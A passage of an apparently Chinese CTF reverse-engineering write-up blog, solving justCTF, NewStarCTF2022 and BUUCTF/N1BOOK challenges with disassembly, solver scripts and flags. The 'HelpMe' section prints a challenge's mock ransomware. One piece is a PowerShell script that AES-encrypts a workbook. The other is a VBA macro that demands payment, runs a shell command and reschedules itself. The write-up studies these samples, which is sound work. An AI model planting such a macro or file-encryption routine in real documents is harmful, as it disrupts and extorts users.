bx, ax</span><br><span class="line">seg000:<span class="number">014</span>D                 loop    loc_1014A</span><br><span class="line">seg000:<span class="number">014F</span>                 cmp     bx, cs:word_1005E</span><br><span class="line">seg000:<span class="number">0154</span>                 jnz     <span class="type">short</span> loc_10171</span><br><span class="line">seg000:<span class="number">0156</span>                 mov     si, <span class="number">34</span>h ; <span class="string">&#x27;4&#x27;</span></span><br><span class="line">seg000:<span class="number">0159</span>                 mov     cx, cs:word_10088</span><br><span class="line">seg000:<span class="number">015</span>E                 <span class="keyword">xor</span>     bx, bx</span><br><span class="line">seg000:<span class="number">0160</span>                 <span class="keyword">xor</span>     ah, ah</span><br><span class="line">seg000:<span class="number">0162</span></span><br><span class="line">seg000:<span class="number">0162</span> loc_10162:                              ; CODE XREF: start+DB↓j</span><br><span class="line">seg000:<span class="number">0162</span>                 lodsb</span><br><span class="line">seg000:<span class="number">0163</span>                 add     bx, ax</span><br><span class="line">seg000:<span class="number">0165</span>                 loop    loc_10162</span><br><span class="line">seg000:<span class="number">0167</span>                 cmp     bx, cs:word_1005C</span><br><span class="line">seg000:<span class="number">016</span>C                 jnz     <span class="type">short</span> loc_10171</span><br><span class="line">seg000:<span class="number">016</span>E                 mov     dx, <span class="number">34</span>h ; <span class="string">&#x27;4&#x27;</span></span><br></pre></td></tr></table></figure><p>分别跟0D9F和0FD9做了cmp<br>每个cmp前面有一个超短的loop add 猜测是累加求和 类似sum()<br>然而其他部分的汇编看着真累。。。<br>大致能找到有一处xor<br>这里可以看出是一个二重循环xor</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">seg000:<span class="number">0115</span> loc_10115:                              ; CODE XREF: start+A8↓j</span><br><span class="line">seg000:<span class="number">0115</span>                 mov     di, <span class="number">34</span>h ; <span class="string">&#x27;4&#x27;</span></span><br><span class="line">seg000:<span class="number">0118</span>                 push    cx</span><br><span class="line">seg000:<span class="number">0119</span>                 add     di, bx</span><br><span class="line">seg000:<span class="number">011B</span>                 mov     cx, cs:word_10088</span><br><span class="line">seg000:<span class="number">0120</span>                 sub     cx, bx</span><br><span class="line">seg000:<span class="number">0122</span></span><br><span class="line">seg000:<span class="number">0122</span> loc_10122:                              ; CODE XREF: start+A3↓j</span><br><span class="line">seg000:<span class="number">0122</span>                 mov     al, [si]</span><br><span class="line">seg000:<span class="number">0124</span>                 mov     ah, es:[di]</span><br><span class="line">seg000:<span class="number">0127</span>                 <span class="keyword">xor</span>     al, ah</span><br><span class="line">seg000:<span class="number">0129</span>                 mov     es:[di], al</span><br><span class="line">seg000:<span class="number">012</span>C                 inc     di</span><br><span class="line">seg000:<span class="number">012</span>D                 loop    loc_10122</span><br><span class="line">seg000:<span class="number">012F</span>                 pop     cx</span><br><span class="line">seg000:<span class="number">0130</span>                 inc     si</span><br><span class="line">seg000:<span class="number">0131</span>                 inc     bx</span><br><span class="line">seg000:<span class="number">0132</span>                 loop    loc_10115</span><br></pre></td></tr></table></figure><p>通过word_10088的值0x27能知道循环是 0~39<br>还原大概这个样子:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">output = [<span class="number">0x3E</span>, <span class="number">0x49</span>, <span class="number">0x26</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x22</span>, <span class="number">0x42</span>, <span class="number">0x10</span>, <span class="number">0x66</span>, <span class="number">0x0B</span>, <span class="number">0x6C</span>, <span class="number">0x06</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>, <span class="number">0x0F</span>, <span class="number">0x4C</span>, <span class="number">0x25</span>, <span class="number">0x4C</span>, <span class="number">0x3F</span>, <span class="number">0x12</span>, <span class="number">0x56</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, <span class="number">0x5A</span>, <span class="number">0x14</span>, <span class="number">0x61</span>, <span class="number">0x4A</span>, <span class="number">0x3F</span>, <span class="number">0x5D</span>, <span class="number">0x51</span>, <span class="number">0x12</span>, <span class="number">0x5C</span>, <span class="number">0x18</span>, <span class="number">0x05</span>, <span class="number">0x43</span>, <span class="number">0x39</span>, <span class="number">0x4F</span>, <span class="number">0x32</span>, <span class="number">0x0A</span>] <span class="comment"># 34h</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">input</span>)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>(<span class="built_in">input</span>)):</span><br><span class="line">        output[j] ^= <span class="built_in">input</span>[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">sum</span>(<span class="built_in">input</span>)==<span class="number">0xD9F</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">sum</span>(output)==<span class="number">0xFD9</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(output))</span><br></pre></td></tr></table></figure><p>只是现在不知道input和output<br>然而巧合的是<br>“This program cannot be run in DOS mode.”的sum值恰好等于0xd9f…<br>所以这就是input…<br>那么对应得到output<br><strong>justCTF{just_a_rusty_old_DOS_stub_task}</strong></p><hr><hr><p>这真不是能做的题 orz</p><h1 id="NewStarCTF2022"><a href="#NewStarCTF2022" class="headerlink" title="NewStarCTF2022"></a>NewStarCTF2022</h1><h2 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h2><h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><p>考察了一点点异常处理<br>在这里tea里面:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 -= <span class="number">0x61C88647</span>;</span><br><span class="line">      MEMORY[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      v11 += (v7 + (v10 &gt;&gt; <span class="number">5</span>)) ^ (v9 + v10) ^ (v8 + <span class="number">16</span> * v10);</span><br><span class="line">      v10 += (v5 + (v11 &gt;&gt; <span class="number">5</span>)) ^ (v9 + v11) ^ (v6 + <span class="number">16</span> * v11);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>filter始终返回1 handler:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">006</span>A18C9 ;   __except(loc_6A18BC) <span class="comment">// owned by 6A18A4</span></span><br><span class="line">.text:<span class="number">006</span>A18C9                 mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">.text:<span class="number">006</span>A18CC                 mov     eax, [ebp+var_48]</span><br><span class="line">.text:<span class="number">006</span>A18CF                 <span class="keyword">xor</span>     eax, <span class="number">12345678</span>h</span><br><span class="line">.text:<span class="number">006</span>A18D4                 mov     [ebp+var_48], eax</span><br><span class="line">.text:<span class="number">006</span>A18D7                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br></pre></td></tr></table></figure><p>对key值进行了xor处理 分奇偶逆就行了 注意我们实则是i:31-&gt;0的逆向 所以先+DELTA2(xor key了的)<br>flag:<br><strong>flag{44C3A7F112DA2BE728F451C5E2D09558}</strong></p><h3 id="HelpMe"><a href="#HelpMe" class="headerlink" title="HelpMe"></a>HelpMe</h3><p>挺好玩的题的<br>首先ps1写了个base64encode的zip 在线网站解后保存解压 得到加密xlsm文件的代码</p><figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$timestamp</span> = ([<span class="built_in">DateTime</span><span class="type">Offset</span>](<span class="built_in">Get-Date</span> <span class="string">&quot;Sat Oct 01 2022 20:22:21&quot;</span>)).ToUnixTimeSeconds()</span><br><span class="line"><span class="variable">$key</span> = <span class="built_in">New-Object</span> Byte[] <span class="number">16</span></span><br><span class="line"><span class="built_in">Get-Random</span> <span class="literal">-Max</span> <span class="number">256</span> <span class="literal">-SetSeed</span> <span class="variable">$timestamp</span> &gt;<span class="variable">$null</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$index</span> = <span class="number">0</span>; <span class="variable">$index</span> <span class="operator">-lt</span> <span class="number">16</span>; <span class="variable">$index</span>++) &#123;<span class="variable">$key</span>[<span class="variable">$index</span>] = [<span class="built_in">byte</span>](<span class="built_in">Get-Random</span> <span class="literal">-Max</span> <span class="number">256</span>)&#125;</span><br><span class="line"><span class="variable">$AES</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.AesManaged</span><br><span class="line"><span class="variable">$AES</span>.Key = <span class="variable">$key</span></span><br><span class="line"><span class="variable">$AES</span>.Mode = <span class="string">&quot;ECB&quot;</span></span><br><span class="line"><span class="variable">$AES</span>.Padding = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::PKCS7</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;<span class="variable">$mypath</span>\mygift.xlsm&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.IO.File</span>]::ReadAllBytes(<span class="string">&quot;<span class="variable">$file</span>&quot;</span>)</span><br><span class="line"><span class="variable">$Encryptor</span> = <span class="variable">$AES</span>.CreateEncryptor()</span><br><span class="line"><span class="variable">$encdata</span> = <span class="variable">$Encryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)</span><br><span class="line"><span class="variable">$Encryptor</span>.Dispose()</span><br><span class="line"><span class="variable">$AES</span>.Dispose()</span><br><span class="line"><span class="built_in">Set-Content</span> <span class="literal">-Value</span> <span class="variable">$encdata</span> <span class="literal">-Encoding</span> Byte <span class="string">&quot;<span class="variable">$file</span>.enc&quot;</span></span><br></pre></td></tr></table></figure><p>稍作修改: En-&gt;De 运行即可解压获得xlsm<br>打开发现有宏代码<br>看<a href="https://jingyan.baidu.com/article/02027811de95305bcc9ce5f3.html">这篇</a><br>打开开发者选项 选择Micxxx Visualxxx<br>就可以看到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">Sub <span class="title">hack</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    MsgBox &quot;You have to pay me a lot of money now!&quot;</span></span><br><span class="line"><span class="function">    Dim shell</span></span><br><span class="line"><span class="function">    Dim talk</span></span><br><span class="line"><span class="function">    Set talk </span>= <span class="built_in">CreateObject</span>(<span class="string">&quot;SAPI.SpVoice&quot;</span>)</span><br><span class="line">    talk.Rate = <span class="number">-3</span></span><br><span class="line">    talk.Volume = <span class="number">100</span></span><br><span class="line">    talk.Speak <span class="string">&quot;You have to pay me a lot of money now&quot;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    Dim a, b, x, arr</span><br><span class="line">    a = <span class="number">20</span></span><br><span class="line">    b = <span class="number">22</span></span><br><span class="line">    x = <span class="number">21</span></span><br><span class="line">    </span><br><span class="line">    arr = <span class="built_in">Array</span>(<span class="number">2</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">23</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">26</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">17</span>, <span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line">    Dim i</span><br><span class="line">    </span><br><span class="line">    For i = <span class="number">1</span> To <span class="number">32</span></span><br><span class="line">    If <span class="built_in">Cells</span>(<span class="number">1</span>, i).Value = <span class="string">&quot;*&quot;</span> Then Exit For</span><br><span class="line">    <span class="built_in">Cells</span>(<span class="number">2</span>, <span class="built_in">arr</span>(i - <span class="number">1</span>) + <span class="number">1</span>).Value = <span class="built_in">Cells</span>(<span class="number">1</span>, i).Value Xor x</span><br><span class="line">    x = (a * x + b) Mod <span class="number">255</span></span><br><span class="line">    <span class="built_in">Cells</span>(<span class="number">1</span>, i).Value = <span class="string">&quot;*&quot;</span></span><br><span class="line">    Next</span><br><span class="line">    talk.Speak <span class="string">&quot;I have hacked you&quot;</span></span><br><span class="line">    Set sh = <span class="built_in">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">    sh.<span class="built_in">Run</span> (<span class="string">&quot;%comspec% /k tree&quot;</span>), <span class="number">3</span>, True</span><br><span class="line">    ActiveWorkbook.Close</span><br><span class="line">    alertTime = Now + <span class="built_in">TimeValue</span>(<span class="string">&quot;00:00:30&quot;</span>)</span><br><span class="line">    Application.OnTime alertTime, <span class="string">&quot;hack&quot;</span></span><br><span class="line">    </span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>跟着解就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&quot;6216311524114989216452013822087542135931616011521516966321321412118495159312191&quot;</span></span><br><span class="line">enc = enc.split(<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">enc = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> enc]</span><br><span class="line">a = <span class="number">20</span></span><br><span class="line">b = <span class="number">22</span></span><br><span class="line">x = <span class="number">21</span></span><br><span class="line">pos = [<span class="number">2</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">23</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">26</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">17</span>, <span class="number">4</span>]</span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">33</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    flag[i] = x^enc[pos[i-<span class="number">1</span>]]</span><br><span class="line">    x = (a*x+b)%<span class="number">255</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>flag{This_is_@_begin_about@hack}</strong></p><h2 id="WEEK5"><a href="#WEEK5" class="headerlink" title="WEEK5"></a>WEEK5</h2><h3 id="Virtual-Self"><a href="#Virtual-Self" class="headerlink" title="Virtual Self"></a>Virtual Self</h3><p>傻逼题…<br>跟着vm打印435行字节码 逐个字符手扣…<br>部分手扣如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">flag[<span class="number">3</span>] = (<span class="built_in">chr</span>(((enc[<span class="number">3</span>]+<span class="number">2</span>)^<span class="number">20</span>)-<span class="number">2</span>))</span><br><span class="line">flag[<span class="number">10</span>] = (<span class="built_in">chr</span>((enc[<span class="number">10</span>]^<span class="number">97</span>^<span class="number">3</span>)))</span><br><span class="line">flag[<span class="number">17</span>] = <span class="built_in">chr</span>(((enc[<span class="number">17</span>]^<span class="number">3</span>)+<span class="number">2</span>)^<span class="number">1</span>)</span><br><span class="line">flag[<span class="number">22</span>] = <span class="built_in">chr</span>((((enc[<span class="number">22</span>]^<span class="number">230</span>)^<span class="number">1</span>)+<span class="number">252</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">5</span>] = <span class="built_in">chr</span>((((((((enc[<span class="number">5</span>]-<span class="number">1</span>)^<span class="number">1</span>^<span class="number">74</span>)-<span class="number">112</span>)+<span class="number">23</span>)+<span class="number">1</span>)^<span class="number">74</span>)+<span class="number">23</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">0</span>] = <span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">7</span>] = <span class="built_in">chr</span>(((enc[<span class="number">7</span>]+<span class="number">6</span>)^<span class="number">2</span>)+<span class="number">1</span>)</span><br><span class="line">flag[<span class="number">25</span>] = <span class="built_in">chr</span>((((enc[<span class="number">25</span>]+<span class="number">2</span>)^<span class="number">1</span>)-<span class="number">50</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">23</span>] = <span class="built_in">chr</span>(((enc[<span class="number">23</span>]^<span class="number">1</span>)+<span class="number">2</span>))</span><br><span class="line">flag[<span class="number">14</span>] = <span class="built_in">chr</span>((((((enc[<span class="number">14</span>]+(<span class="number">80</span>^<span class="number">249</span>))+<span class="number">252</span>-<span class="number">2</span>*<span class="number">228</span>)))&amp;<span class="number">0xff</span>))</span><br><span class="line">flag[<span class="number">19</span>] = <span class="built_in">chr</span>(enc[<span class="number">19</span>]-<span class="number">1</span>)</span><br><span class="line">flag[<span class="number">26</span>] = <span class="built_in">chr</span>(((((enc[<span class="number">26</span>]^<span class="number">3</span>)+<span class="number">30</span>)^<span class="number">2</span>^<span class="number">177</span>)-<span class="number">58</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">20</span>] = <span class="built_in">chr</span>((((((((enc[<span class="number">20</span>]-((<span class="number">8</span>^<span class="number">149</span>)-<span class="number">70</span>))^<span class="number">1</span>)-<span class="number">16</span>)^<span class="number">2</span>))))&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">2</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">18</span>] = <span class="built_in">chr</span>(((((((enc[<span class="number">18</span>]-<span class="number">5</span>)^<span class="number">1</span>^<span class="number">3</span>)))))&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">4</span>] = <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">flag[<span class="number">6</span>] = <span class="built_in">chr</span>(((((enc[<span class="number">6</span>]+<span class="number">3</span>)^<span class="number">3</span>)-<span class="number">2</span>)^<span class="number">3</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">11</span>] = <span class="built_in">chr</span>(((((((enc[<span class="number">11</span>]+<span class="number">174</span>)^(-<span class="number">58</span>))-<span class="number">1</span>))))&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">21</span>] = <span class="built_in">chr</span>((((((((enc[<span class="number">21</span>]-<span class="number">3</span>)^<span class="number">2</span>)+<span class="number">3</span>+<span class="number">236</span>+<span class="number">236</span>)^<span class="number">3</span>))))&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">9</span>] = <span class="built_in">chr</span>((((((((enc[<span class="number">9</span>]+<span class="number">2</span>)^<span class="number">2</span>)-<span class="number">23</span>)))))&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">28</span>] = <span class="built_in">chr</span>(((((((enc[<span class="number">28</span>]^<span class="number">28</span>)-<span class="number">1</span>)^<span class="number">28</span>)-<span class="number">3</span>)))&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">15</span>] = <span class="built_in">chr</span>((((((((((enc[<span class="number">15</span>]+(<span class="number">165</span>^<span class="number">177</span>)-<span class="number">53</span>)^<span class="number">3</span>)+<span class="number">2</span>)^<span class="number">3</span>))))))&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">16</span>] = <span class="built_in">chr</span>(((((enc[<span class="number">16</span>]-<span class="number">2</span>)^<span class="number">227</span>)-<span class="number">2</span>))&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">8</span>] = <span class="built_in">chr</span>((((((((enc[<span class="number">8</span>]-(<span class="number">106</span>^<span class="number">43</span>))^<span class="number">43</span>)-<span class="number">1</span>)^<span class="number">43</span>))))&amp;<span class="number">0xff</span>)</span><br><span class="line">flag[<span class="number">13</span>] = <span class="built_in">chr</span>((enc[<span class="number">13</span>]^<span class="number">2</span>^<span class="number">3</span>^<span class="number">1</span>)&amp;<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure><p>然后就能猜出flag了<br><strong>flag{Will_you_see_the_light?}</strong></p><h1 id="BUUCTF-N1BOOK"><a href="#BUUCTF-N1BOOK" class="headerlink" title="BUUCTF&#x2F;N1BOOK"></a>BUUCTF&#x2F;N1BOOK</h1><p>里面有go和rust的题 记得一两个月前看毫无头绪 现在看好多了</p><h2 id="easy-rust"><a href="#easy-rust" class="headerlink" title="easy_rust"></a>easy_rust</h2><p>由于rust代码冗长 所以我们可以通过string搜索关键字符串 比如搜索flag<br>找到输入点 发现在一个base64encode里<br>再在函数列表搜索main 进入main<br>核心逻辑就这两句:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">BASE64ENCODE</span>((__int64)v14, (__int64)(&amp;v11.private_2 + <span class="number">1</span>));</span><br><span class="line"><span class="keyword">if</span> ( (_$LT$alloc..string..<span class="type">String</span>$u20$<span class="keyword">as</span>$u20$core..cmp..<span class="built_in">PartialEq</span>$GT$::eq::<span class="title function_ invoke__">h785456d93284be99</span>(v14, &amp;v11) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>这是base64和check<br>发现check的两个值都在base64encode的参数里<br>进入base64encode 可以发现这样一句</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">core::panicking::panic::<span class="title function_ invoke__">hb5daa85c7c72fc62</span>(</span><br><span class="line">        <span class="string">&quot;attempt to add with overflowxkPmey0LoJt4u5A9MznQhZEH6VSUvRX=Y13fi8srlaTdwGB2+q7cg/bKjpNCFIODInput your flag:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Ufy3UbIdXc82u0z=Sfk3=MlWFailed to read lineTrue!\n&quot;</span></span><br><span class="line">        <span class="string">&quot;False!\n&quot;</span>,</span><br><span class="line">        <span class="number">28</span>LL,</span><br><span class="line">        &amp;off_23FE58);</span><br></pre></td></tr></table></figure><p>结合语言特性 这种就是把函数用上的参数&#x2F;字符串 都写进去了<br>很容易猜出overflow后面的是base64变表 flag后面的是密文<br>变表base64解就行了</p><p><strong>n1book{9o0d_j0b}</strong></p><h2 id="easy-go"><a href="#easy-go" class="headerlink" title="easy_go"></a>easy_go</h2><p>函数列表搜索main 进入main_main<br>查找发现没有main_init 所以放心分析main_main即可<br>代码很短<br>check len and format:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( p_string-&gt;<span class="built_in">len</span> == <span class="number">21</span></span><br><span class="line">    &amp;&amp; (*(_DWORD *)ptr != <span class="number">1868706158</span> || *((_WORD *)ptr + <span class="number">2</span>) != <span class="number">27503</span> ? (v1 = <span class="number">0</span>) : (v1 = ptr[<span class="number">6</span>] == <span class="number">123</span>),</span><br><span class="line">        v1 &amp;&amp; ptr[<span class="number">20</span>] == <span class="number">125</span>) )</span><br></pre></td></tr></table></figure><p>Final_Check:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>LL; i &lt; <span class="number">13</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= v4 )</span><br><span class="line">        runtime_panicIndex();</span><br><span class="line">      <span class="keyword">if</span> ( byte_561538[i] + byte_561518[i] * *(_BYTE *)(i + v3) != byte_561528[i] )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>找到对应值 爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0xB7</span>, <span class="number">0x9C</span>, <span class="number">0x79</span>, <span class="number">0x43</span>, <span class="number">0x9B</span>, <span class="number">0xAF</span>, <span class="number">0x94</span>, <span class="number">0xE4</span>, <span class="number">0x94</span>, <span class="number">0x71</span>, <span class="number">0xEC</span>, <span class="number">0xEA</span>, <span class="number">0x8E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">key1 = [<span class="number">0xD3</span>, <span class="number">0x75</span>, <span class="number">0x9B</span>, <span class="number">0xF9</span>, <span class="number">0xA3</span>, <span class="number">0x87</span>, <span class="number">0xED</span>, <span class="number">0x93</span>, <span class="number">0x8D</span>, <span class="number">0xDD</span>, <span class="number">0x77</span>, <span class="number">0xED</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">key2 = [<span class="number">0xDB</span>, <span class="number">0x9E</span>, <span class="number">0xB7</span>, <span class="number">0x9A</span>, <span class="number">0x91</span>, <span class="number">0xCA</span>, <span class="number">0xA1</span>, <span class="number">0x6B</span>, <span class="number">0x97</span>, <span class="number">0xC1</span>, <span class="number">0x74</span>, <span class="number">0xB3</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">flag = <span class="string">&quot;n1book&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        check = (key2[i]+key1[i]*x)&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> check==enc[i]:</span><br><span class="line">            flag += <span 